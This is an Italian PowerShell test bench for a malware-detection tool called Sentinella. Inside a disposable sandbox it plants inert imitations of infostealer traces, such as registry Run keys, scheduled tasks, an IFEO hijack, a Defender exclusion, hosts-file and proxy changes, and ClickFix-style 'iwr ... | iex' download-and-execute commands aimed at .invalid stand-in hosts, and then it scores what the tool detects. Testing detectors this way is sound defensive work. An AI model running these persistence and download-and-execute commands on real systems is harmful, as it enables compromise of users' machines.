# =====================================================================
#  BANCO DI PROVA di Sentinella  -  gira SOLO dentro Windows Sandbox
#
#  Piazza tracce FINTE e innocue che imitano quelle lasciate dagli
#  infostealer (avvio automatico, attivita', ClickFix, Discord
#  manomesso, esclusioni antivirus...), lancia Sentinella e misura
#  quante ne scopre. Nessuna traccia contiene codice dannoso: gli
#  eseguibili non fanno nulla, i comandi "offuscati" scrivono "ciao",
#  i link puntano a domini .invalid (che per standard non esistono).
#  Il file EICAR e' la stringa di prova ufficiale che ogni antivirus
#  riconosce apposta, innocua per definizione.
#
#  Due passaggi:
#    1. scansione del sistema PULITO -> quanti falsi allarmi
#    2. tracce piazzate, nuova scansione -> quante tracce rilevate
#  Risultati in <cartella risultati>\banco-<data>.json e .md
#
#  Ogni traccia e' etichettata con la tecnica MITRE ATT&CK che imita.
# =====================================================================
param(
    [string]$Sentinella = 'C:\Sentinella',
    [string]$Risultati  = 'C:\Risultati',
    [ValidateSet('Lampo', 'Rapida')][string]$Modo = 'Rapida'
)
$ErrorActionPreference = 'Continue'

# Sicura: le tracce toccano punti delicati di Windows. Il banco parte solo
# su una macchina usa e getta: Windows Sandbox (utente WDAGUtilityAccount)
# o un computer di GitHub Actions (cancellato a fine prova). Mai sul tuo PC.
$sandbox = ($env:USERNAME -eq 'WDAGUtilityAccount')
$cloud = ($env:GITHUB_ACTIONS -eq 'true' -and $env:RUNNER_ENVIRONMENT -eq 'github-hosted')
if (-not ($sandbox -or $cloud)) {
    Write-Host "Il banco di prova gira solo su una macchina usa e getta (Windows Sandbox o GitHub Actions)." -ForegroundColor Red
    exit 9
}
$ambiente = 'Windows Sandbox'
if ($cloud) { $ambiente = "GitHub Actions ($((Get-CimInstance Win32_OperatingSystem).Caption))" }

if (-not (Test-Path $Risultati)) { New-Item -ItemType Directory -Path $Risultati -Force | Out-Null }
$registro = Join-Path $Risultati 'banco-in-corso.log'
function Log($t) { $r = "$(Get-Date -Format 'HH:mm:ss')  $t"; Write-Host $r; Add-Content -Path $registro -Value $r }
$M = 'SentinellaProva'   # marcatore presente in ogni traccia: serve a riconoscerla nel report

# ---------------------------------------------------------------- ESEGUIBILE FINTO
# Un programma che non fa nulla (o aspetta, se gli si chiede di restare
# acceso per simulare un processo in esecuzione). Non firmato, come i
# malware comuni: e' proprio quello che Sentinella deve notare.
$cartellaFinta = Join-Path $env:APPDATA $M
New-Item -ItemType Directory -Path $cartellaFinta -Force | Out-Null
$exe = Join-Path $cartellaFinta "$M-agent.exe"
Add-Type -OutputType ConsoleApplication -OutputAssembly $exe -TypeDefinition @'
public static class Programma {
    public static void Main(string[] a) {
        if (a.Length > 0 && a[0] == "attendi") System.Threading.Thread.Sleep(900000);
    }
}
'@
Log "Eseguibile finto creato: $exe"

# ---------------------------------------------------------------- TRACCE
# Atteso: livello minimo che Sentinella deve dare perche' la traccia conti
# come rilevata (grave > da-guardare > nota). Cerca: testo che deve
# comparire nella riga del report.
$tracce = @(
    @{ Id = 'T1547.001-a'; Nome = 'Chiave Run con PowerShell nascosto e offuscato'; Atteso = 'grave'; Cerca = "$M-Run-Enc"
       Piazza = { $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output 'ciao'"))
                  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' "$M-Run-Enc" "powershell.exe -w hidden -enc $enc" } }
    @{ Id = 'T1547.001-b'; Nome = 'Chiave Run con eseguibile non firmato in AppData'; Atteso = 'grave'; Cerca = "$M-Run-Exe"
       Piazza = { Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' "$M-Run-Exe" "`"$exe`"" } }
    @{ Id = 'T1547.001-c'; Nome = 'Collegamento nella cartella Esecuzione automatica'; Atteso = 'da-guardare'; Cerca = "$M-avvio.lnk"
       Piazza = { $l = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$M-avvio.lnk"); $l.TargetPath = $exe; $l.Save() } }
    @{ Id = 'T1053.005-a'; Nome = 'Attivita pianificata con eseguibile non firmato'; Atteso = 'grave'; Cerca = "$M-Task-Exe"
       Piazza = { Register-ScheduledTask -TaskName "$M-Task-Exe" -Action (New-ScheduledTaskAction -Execute $exe) -Trigger (New-ScheduledTaskTrigger -AtLogOn) | Out-Null } }
    @{ Id = 'T1053.005-b'; Nome = 'Attivita pianificata che scarica ed esegue (download cradle)'; Atteso = 'grave'; Cerca = "$M-Task-Cradle"
       Piazza = { Register-ScheduledTask -TaskName "$M-Task-Cradle" -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-w hidden -c `"iex (iwr http://$M.invalid/p.ps1)`"") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) | Out-Null } }
    @{ Id = 'T1543.003'; Nome = 'Servizio con eseguibile non firmato in ProgramData'; Atteso = 'grave'; Cerca = "$M-Servizio"
       Piazza = { $d = "$env:ProgramData\$M"; New-Item -ItemType Directory $d -Force | Out-Null; Copy-Item $exe "$d\$M-svc.exe"
                  New-Service -Name "$M-Servizio" -BinaryPathName "`"$d\$M-svc.exe`"" -StartupType Manual | Out-Null } }
    @{ Id = 'T1546.003'; Nome = 'Sottoscrizione WMI (filtro eventi)'; Atteso = 'da-guardare'; Cerca = "$M-WMI"
       Piazza = { Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = "$M-WMI"; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 3" } | Out-Null } }
    @{ Id = 'T1546.012'; Nome = 'Dirottamento IFEO (debugger)'; Atteso = 'grave'; Cerca = "$M-vittima.exe"
       Piazza = { $k = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$M-vittima.exe"; New-Item $k -Force | Out-Null; Set-ItemProperty $k Debugger $exe } }
    @{ Id = 'T1547.004'; Nome = 'Winlogon Userinit modificato'; Atteso = 'grave'; Cerca = "$M-agent.exe"
       Piazza = { $k = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'; Set-ItemProperty $k Userinit "C:\Windows\system32\userinit.exe,$exe," } }
    @{ Id = 'T1562.001'; Nome = 'Esclusione di Defender su una cartella'; Atteso = 'grave'; Cerca = "$M"
       Controllo = 'Esclusioni'
       Piazza = { Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\$M-nascosto" } }
    @{ Id = 'T1565.001'; Nome = 'Sito dirottato nel file hosts'; Atteso = 'grave'; Cerca = "$M"
       Controllo = 'Rete'
       Piazza = { Add-Content "$env:SystemRoot\System32\drivers\etc\hosts" "`r`n10.66.66.66 accounts.$M.invalid" } }
    @{ Id = 'T1090'; Nome = 'Proxy di sistema attivato'; Atteso = 'grave'; Cerca = "$M"
       Controllo = 'Rete'
       Piazza = { $k = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'; Set-ItemProperty $k ProxyEnable 1; Set-ItemProperty $k ProxyServer "$M.invalid:8080" } }
    @{ Id = 'T1204.004-a'; Nome = 'ClickFix: comando incollato in Win+R'; Atteso = 'grave'; Cerca = "$M"
       Controllo = 'Comandi incollati'
       Piazza = { $k = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'; New-Item $k -Force | Out-Null
                  Set-ItemProperty $k a "powershell -w hidden -c `"iwr $M.invalid/v|iex`" # I am not a robot - Verification ID: 7731\1"; Set-ItemProperty $k MRUList 'a' } }
    @{ Id = 'T1204.004-b'; Nome = 'FileFix: comando incollato nella barra di Esplora file'; Atteso = 'grave'; Cerca = "$M"
       Controllo = 'Comandi incollati'
       Piazza = { $k = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths'; New-Item $k -Force | Out-Null
                  Set-ItemProperty $k url1 "powershell -nop -w hidden -c `"irm https://$M.invalid/f | iex`"   C:\Documenti\Fattura.pdf" } }
    @{ Id = 'T1059.001'; Nome = 'Cronologia PowerShell con scarica-ed-esegui nascosto'; Atteso = 'grave'; Cerca = "$M"
       Controllo = 'Comandi incollati'
       Piazza = { $f = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; New-Item (Split-Path $f) -ItemType Directory -Force | Out-Null
                  Add-Content $f "powershell -w hidden -nop -c `"irm https://$M.invalid/s | iex`"" } }
    @{ Id = 'T1105'; Nome = 'Eseguibile non firmato scaricato da internet (Mark of the Web)'; Atteso = 'da-guardare'; Cerca = "$M-cheat.exe"
       Piazza = { $d = Join-Path $env:USERPROFILE 'Downloads'; New-Item $d -ItemType Directory -Force | Out-Null; $f = "$d\$M-cheat.exe"; Copy-Item $exe $f
                  Set-Content -Path $f -Stream Zone.Identifier -Value "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=https://cheats.$M.invalid/$M-cheat.exe" } }
    @{ Id = 'T1204.002'; Nome = 'Programma avviato dai Download e poi cancellato'; Atteso = 'da-guardare'; Cerca = "$M-usa-e-getta.exe"
       Piazza = { $d = Join-Path $env:USERPROFILE 'Downloads'; $f = "$d\$M-usa-e-getta.exe"; Copy-Item $exe $f
                  Start-Process $f -Wait; Start-Sleep 2; Remove-Item $f -Force } }
    @{ Id = 'T1036'; Nome = 'Processo non firmato in esecuzione da AppData'; Atteso = 'da-guardare'; Cerca = "$M-agent"
       Controllo = 'Processi'
       Piazza = { Start-Process $exe -ArgumentList 'attendi' -WindowStyle Hidden } }
    @{ Id = 'T1554'; Nome = 'Discord con file di avvio manomesso (furto token)'; Atteso = 'grave'; Cerca = 'Discord'
       Controllo = 'Discord'
       Piazza = { $d = "$env:LOCALAPPDATA\Discord\app-1.0.9999\modules\discord_desktop_core-1\discord_desktop_core"; New-Item $d -ItemType Directory -Force | Out-Null
                  Set-Content "$d\index.js" "// ${M}: riga finta, non fa nulla`r`nconst x = 'https://$M.invalid/raccolta';`r`nmodule.exports = require('./core.asar');" } }
    @{ Id = 'EICAR'; Nome = 'File di prova antivirus EICAR'; Atteso = 'nota'; Cerca = 'EICAR'
       Piazza = { # La stringa e' spezzata qui dentro, cosi' questo script non viene scambiato
                  # lui stesso per il file di prova: Defender deve accorgersi del FILE creato.
                  $e = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
                  $d = Join-Path $env:USERPROFILE 'Downloads'; [IO.File]::WriteAllText("$d\$M-eicar.com", $e); Start-Sleep 5 } }
)

# ---------------------------------------------------------------- SCANSIONE
function Scansiona([string]$etichetta) {
    Log "Scansione Sentinella ($Modo) - $etichetta"
    $t0 = Get-Date
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $Sentinella 'sentinella.ps1') -Modo $Modo -Silenzioso | ForEach-Object { Log "   $_" }
    $codice = $LASTEXITCODE
    $j = Get-ChildItem "$env:LOCALAPPDATA\Sentinella\storico" -Filter 'scansione-*.json' | Sort-Object Name -Descending | Select-Object -First 1
    $dati = Get-Content $j.FullName -Raw | ConvertFrom-Json
    Copy-Item $j.FullName (Join-Path $Risultati "sentinella-$etichetta.json") -Force
    Log ("   finita in {0:N0} s, codice {1}: {2}" -f ((Get-Date) - $t0).TotalSeconds, $codice, $dati.verdetto.titolo)
    return $dati
}
function Grado([string]$livello) {
    if ($livello -like '*-grave') { return 3 }
    if ($livello -like '*-da-guardare') { return 2 }
    if ($livello -eq 'nota') { return 1 }
    return 0
}
$gradoAtteso = @{ grave = 3; 'da-guardare' = 2; nota = 1 }

# 1. Sistema pulito: tutto quello che Sentinella segnala qui e' un falso allarme.
$pulito = Scansiona 'pulito'
$falsi = @($pulito.reperti | Where-Object { (Grado $_.livello) -ge 2 })
Log "Falsi allarmi sul sistema pulito: $($falsi.Count)"

# 2. Tracce.
foreach ($t in $tracce) {
    try { & $t.Piazza; $t.Piazzata = $true; Log "Piazzata  $($t.Id)  $($t.Nome)" }
    catch { $t.Piazzata = $false; $t.Errore = $_.Exception.Message; Log "NON piazzata $($t.Id): $($_.Exception.Message)" }
}
# BAM registra gli avvii con qualche secondo di ritardo.
Start-Sleep 20
$sporco = Scansiona 'con-tracce'

# 3. Confronto.
$esiti = foreach ($t in $tracce) {
    $righe = @($sporco.reperti | Where-Object {
        $_.testo -like "*$($t.Cerca)*" -and (-not $t.Controllo -or $_.controllo -like "$($t.Controllo)*")
    })
    $migliore = 0; $dove = ''
    foreach ($r in $righe) { $g = Grado $r.livello; if ($g -gt $migliore) { $migliore = $g; $dove = "$($r.controllo): $($r.livello)" } }
    $stato = 'MANCATA'
    if (-not $t.Piazzata) { $stato = 'NON PIAZZATA' }
    elseif ($migliore -ge $gradoAtteso[$t.Atteso]) { $stato = 'RILEVATA' }
    elseif ($migliore -gt 0) { $stato = 'SOTTOVALUTATA' }
    [pscustomobject]@{ Id = $t.Id; Traccia = $t.Nome; Atteso = $t.Atteso; Esito = $stato; Dove = $dove; Errore = $t.Errore }
}
$piazzate = @($esiti | Where-Object { $_.Esito -ne 'NON PIAZZATA' })
$rilevate = @($esiti | Where-Object { $_.Esito -eq 'RILEVATA' })

$stamp = Get-Date -Format 'yyyyMMdd-HHmm'
[ordered]@{
    data = (Get-Date).ToString('o'); modo = $Modo; versioneSentinella = $sporco.versione
    tracce = $piazzate.Count; rilevate = $rilevate.Count
    falsiAllarmiSistemaPulito = $falsi.Count
    falsiAllarmi = @($falsi | ForEach-Object { "$($_.controllo): $($_.testo)" })
    dettaglio = @($esiti)
} | ConvertTo-Json -Depth 5 | Out-File (Join-Path $Risultati "banco-$stamp.json") -Encoding utf8

$md = @()
$md += "# Banco di prova Sentinella $($sporco.versione) - $(Get-Date -Format 'dd/MM/yyyy HH:mm')"
$md += ""
$md += "Modalita' $Modo, macchina pulita: $ambiente. **Rilevate $($rilevate.Count) tracce su $($piazzate.Count)**, segnalazioni sul sistema pulito: **$($falsi.Count)**."
if ($cloud) {
    $md += ""
    $md += "> Nota: i computer di GitHub hanno Defender indebolito di proposito (esclusioni sui dischi, protezione in tempo reale ridotta) per andare piu' veloci. Le segnalazioni sul sistema pulito qui sono in gran parte VERE per quella macchina, e i risultati legati all'antivirus (es. EICAR) dipendono da Defender, non da Sentinella."
}
$md += ""
$md += "| Tecnica | Traccia | Atteso | Esito | Dove |"
$md += "|---|---|---|---|---|"
foreach ($e in $esiti) { $md += "| $($e.Id) | $($e.Traccia) | $($e.Atteso) | **$($e.Esito)** | $($e.Dove)$($e.Errore) |" }
if ($falsi.Count) { $md += ""; $md += "## Falsi allarmi sul sistema pulito"; foreach ($f in $falsi) { $md += "- $($f.controllo): $($f.testo)" } }
$md | Out-File (Join-Path $Risultati "banco-$stamp.md") -Encoding utf8

Log "RISULTATO: rilevate $($rilevate.Count) su $($piazzate.Count), falsi allarmi $($falsi.Count)"
# Su GitHub la tabella compare direttamente nella pagina della prova.
if ($env:GITHUB_STEP_SUMMARY) { $md | Out-File $env:GITHUB_STEP_SUMMARY -Append -Encoding utf8 }
Set-Content (Join-Path $Risultati 'banco-finito.txt') "banco-$stamp"
